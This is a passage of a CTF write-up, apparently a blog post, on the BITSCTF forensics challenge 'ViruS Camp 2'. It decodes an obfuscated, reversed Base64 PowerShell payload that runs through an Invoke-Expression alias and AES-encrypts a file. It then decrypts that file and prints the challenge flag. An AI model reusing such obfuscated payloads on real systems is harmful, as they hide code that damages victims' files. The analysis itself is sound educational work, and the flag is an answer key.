+</ol>
+<p>The script creates an alias PwN for Invoke-Expression.
+<code>pwn $FHG7xpKlVqaDNgu1c2Utw</code> executes the decoded content.</p>
+<p>What This Means:</p>
+<p>This script likely downloads or executes malicious code stored in the Base64-encoded string. We can decode the Base64 string with the following python code.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> base64</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Extracted Base64-encoded string from the script</span></span>
+<span class="line"><span style="color:#E1E4E8">encoded_string </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> &quot;&quot;&quot;K0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSpQDK0QKoU2cvx2Qu0WYlJHdTRXdvRiCNkCKlN3bsNkLtFWZyR3UvRHc5J3YkoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJK0QKoR3ZuVGTuMXZ0lnQulWYsBHJgwCMgwyclRXeC5WahxGckgSZ0lmcX5SbhVmc0N1b0BXeyNGJK0gCNkSZ0lmcXpjOdVGZv1UbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFIsI3b0BXeyNmblRCIs0WYlJHdTRXdvRCKtFWZyR3UvRHc5J3QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFI0NWZqJ2TtcXZOBSPg0WYlJHdT9GdwlncjRiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkoQDK0QKlxWaGRXdw5WakgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFI9AyclRXeC5WahxGckoQDK0QKoI3b0BXeyNmbFVGdhVmcD5yclFGJg0DIy9Gdwlncj5WZkoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJK0wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5yclFGJK0gdpRCI9AiVJ5yclFGJK0QeltGJg0DI5V2SuMXZhRiCNkCKlRXYlJ3Q6oTXzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIzVWYkoQDK0gIj5WZucWYsZGXcB3b0t2clREXcJXZzVHevJmdcx1cyV2cVxFX6MkIg0DIlxWaGRXdwRXdvRiCNIyZuBnLnFGbmxFXw9GdrNXZExFXyV2c1h3biZHXcNnclNXVcxlODJCI9ASZslmR0VHculGJK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQmcwc3czRDU0NjcjNzU51kIg0DIkJ3b3N3chBHJ&quot;&quot;&quot;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Reverse the string</span></span>
+<span class="line"><span style="color:#E1E4E8">reversed_string </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> encoded_string[::</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Decode from Base64</span></span>
+<span class="line"><span style="color:#F97583">try</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#E1E4E8">    decoded_bytes </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> base64.b64decode(reversed_string)</span></span>
+<span class="line"><span style="color:#E1E4E8">    decoded_string </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> decoded_bytes.decode(</span><span style="color:#9ECBFF">&quot;utf-8&quot;</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">errors</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">&quot;ignore&quot;</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">except</span><span style="color:#79B8FF"> Exception</span><span style="color:#F97583"> as</span><span style="color:#E1E4E8"> e:</span></span>
+<span class="line"><span style="color:#E1E4E8">    decoded_string </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> str</span><span style="color:#E1E4E8">(e)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(decoded_string)</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="mdx"><code><span class="line"><span style="color:#E1E4E8">&#39;$password = &quot;MyS3cr3tP4ssw0rd&quot;\r\n$salt = </span><span style="color:#9ECBFF">[</span><span style="color:#E1E4E8">Byte</span><span style="color:#9ECBFF">[]](</span><span style="color:#DBEDFF;text-decoration:underline">0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08</span><span style="color:#9ECBFF">)</span><span style="color:#E1E4E8">\r\n$iterations = 10000\r\n$keySize = 32 \r\n$ivSize = 16 \r\n\r\n$deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)\r\n$key = $deriveBytes.GetBytes($keySize)\r\n$iv = $deriveBytes.GetBytes($ivSize)\r\n\r\n$inputFile = &quot;C:</span><span style="color:#79B8FF">\\\\</span><span style="color:#E1E4E8">Users</span><span style="color:#79B8FF">\\\\</span><span style="color:#E1E4E8">vboxuser</span><span style="color:#79B8FF">\\\\</span><span style="color:#E1E4E8">Desktop</span><span style="color:#79B8FF">\\\\</span><span style="color:#E1E4E8">flag.png&quot;\r\n$outputFile = &quot;C:</span><span style="color:#79B8FF">\\\\</span><span style="color:#E1E4E8">Users</span><span style="color:#79B8FF">\\\\</span><span style="color:#E1E4E8">vboxuser</span><span style="color:#79B8FF">\\\\</span><span style="color:#E1E4E8">Desktop</span><span style="color:#79B8FF">\\\\</span><span style="color:#E1E4E8">flag.enc&quot;\r\n\r\n$aes = </span><span style="color:#9ECBFF">[</span><span style="color:#E1E4E8">System.Security.Cryptography.Aes</span><span style="color:#9ECBFF">]</span><span style="color:#E1E4E8">::Create()\r\n$aes.Key = $key\r\n$aes.IV = $iv\r\n$aes.Mode = </span><span style="color:#9ECBFF">[</span><span style="color:#E1E4E8">System.Security.Cryptography.CipherMode</span><span style="color:#9ECBFF">]</span><span style="color:#E1E4E8">::CBC\r\n$aes.Padding = </span><span style="color:#9ECBFF">[</span><span style="color:#E1E4E8">System.Security.Cryptography.PaddingMode</span><span style="color:#9ECBFF">]</span><span style="color:#E1E4E8">::PKCS7\r\n\r\n$encryptor = $aes.CreateEncryptor()\r\n\r\n$plainBytes = </span><span style="color:#9ECBFF">[</span><span style="color:#E1E4E8">System.IO.File</span><span style="color:#9ECBFF">]</span><span style="color:#E1E4E8">::ReadAllBytes($inputFile)\r\n\r\n$outStream = New-Object System.IO.FileStream($outputFile, </span><span style="color:#9ECBFF">[</span><span style="color:#E1E4E8">System.IO.FileMode</span><span style="color:#9ECBFF">]</span><span style="color:#E1E4E8">::Create)\r\n$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outStream, $encryptor, </span><span style="color:#9ECBFF">[</span><span style="color:#E1E4E8">System.Security.Cryptography.CryptoStreamMode</span><span style="color:#9ECBFF">]</span><span style="color:#E1E4E8">::Write)\r\n\r\n$&#39;</span></span></code></pre>
+<p>The decoded PowerShell script appears to be performing AES encryption on a file named flag.png located at:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\Users\vboxuser\Desktop\flag.png</span></span></code></pre>
+<p>What I found was that the script uses the password MyS3cr3tP4ssw0rd and a predefined salt [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08]. It performs 10,000 PBKDF2 iterations to derive the AES key. The AES key size is 32 bytes (256-bit), and the IV size is 16 bytes. AES encryption is used for securing the data.
+It then reads the file flag.png, encrypts it, and saves it as flag.enc:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\Users\vboxuser\Desktop\flag.enc</span></span></code></pre>
+<p>We can reverse the encryption with the following python code.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> hashlib</span></span>
+<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> base64</span></span>
+<span class="line"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> Crypto.Cipher </span><span style="color:#F97583">import</span><span style="color:#79B8FF"> AES</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Encryption parameters</span></span>
+<span class="line"><span style="color:#E1E4E8">password </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> &quot;MyS3cr3tP4ssw0rd&quot;</span><span style="color:#E1E4E8">.encode()  </span><span style="color:#6A737D"># Convert password to bytes</span></span>
+<span class="line"><span style="color:#E1E4E8">salt </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> bytes</span><span style="color:#E1E4E8">([</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">01</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">02</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">03</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">04</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">05</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">06</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">07</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">08</span><span style="color:#E1E4E8">])  </span><span style="color:#6A737D"># Salt</span></span>
+<span class="line"><span style="color:#E1E4E8">iterations </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 10000</span></span>
+<span class="line"><span style="color:#E1E4E8">key_size </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 32</span><span style="color:#6A737D">  # 256-bit AES key</span></span>
+<span class="line"><span style="color:#E1E4E8">iv_size </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 16</span><span style="color:#6A737D">  # 16-byte IV</span></span>
+<span class="line"><span style="color:#E1E4E8">input_file </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> &quot;flag.enc&quot;</span></span>
+<span class="line"><span style="color:#E1E4E8">output_file </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> &quot;flag_decrypted.png&quot;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Derive key and IV using PBKDF2</span></span>
+<span class="line"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> Crypto.Protocol.</span><span style="color:#79B8FF">KDF</span><span style="color:#F97583"> import</span><span style="color:#79B8FF"> PBKDF2</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">key_iv </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> PBKDF2(password, salt, </span><span style="color:#FFAB70">dkLen</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">key_size </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> iv_size, </span><span style="color:#FFAB70">count</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">iterations)</span></span>
+<span class="line"><span style="color:#E1E4E8">key </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> key_iv[:key_size]  </span><span style="color:#6A737D"># First 32 bytes for key</span></span>
+<span class="line"><span style="color:#E1E4E8">iv </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> key_iv[key_size:]  </span><span style="color:#6A737D"># Last 16 bytes for IV</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Read the encrypted file</span></span>
+<span class="line"><span style="color:#F97583">with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(input_file, </span><span style="color:#9ECBFF">&quot;rb&quot;</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> f:</span></span>
+<span class="line"><span style="color:#E1E4E8">    encrypted_data </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> f.read()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Decrypt using AES-CBC</span></span>
+<span class="line"><span style="color:#E1E4E8">cipher </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> AES</span><span style="color:#E1E4E8">.new(key, </span><span style="color:#79B8FF">AES</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">MODE_CBC</span><span style="color:#E1E4E8">, iv)</span></span>
+<span class="line"><span style="color:#E1E4E8">decrypted_data </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> cipher.decrypt(encrypted_data)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Remove PKCS7 padding</span></span>
+<span class="line"><span style="color:#E1E4E8">pad_len </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> decrypted_data[</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]</span></span>
+<span class="line"><span style="color:#E1E4E8">decrypted_data </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> decrypted_data[:</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">pad_len]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># Save the decrypted file</span></span>
+<span class="line"><span style="color:#F97583">with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(output_file, </span><span style="color:#9ECBFF">&quot;wb&quot;</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> f:</span></span>
+<span class="line"><span style="color:#E1E4E8">    f.write(decrypted_data)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">&quot;Decryption complete! File saved as </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">output_file</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">&quot;</span><span style="color:#E1E4E8">)</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="plaintext"><code><span class="line"><span>Decryption complete! File saved as flag_decrypted.png</span></span></code></pre>
+<p>Looking at flag_decrypted.png, we can see the flag.</p>
+<img src="/_astro/flag_decrypted.C89NnLSP.png" alt="image" style="max-width:100%;height:auto"/>
+<p>Flag: <code>BITSCTF{h0pe_y0u_enj0yed_th1s_145e3f1a}</code></p>
+<hr/>
+<h2 id="final-remarks">Final remarks</h2>
+<p>Although these DFIR challenges are not really difficult, I still enjoyed solving them, especially <code>ViruS Camp 2</code> where there’s a bit of <code>reverse engineering</code> involved. Thank you for reading my writeups, hope to see you in the next one!</p> </div>  </main> <footer data-astro-cid-sckkx6r4>
+&mdash;
+<a href="https://github.com/gopherhackumn/website" target="_blank" rel="noopener" data-astro-cid-sckkx6r4>Website source</a>
+&mdash;
+</footer> </div> </section> </body></html> 
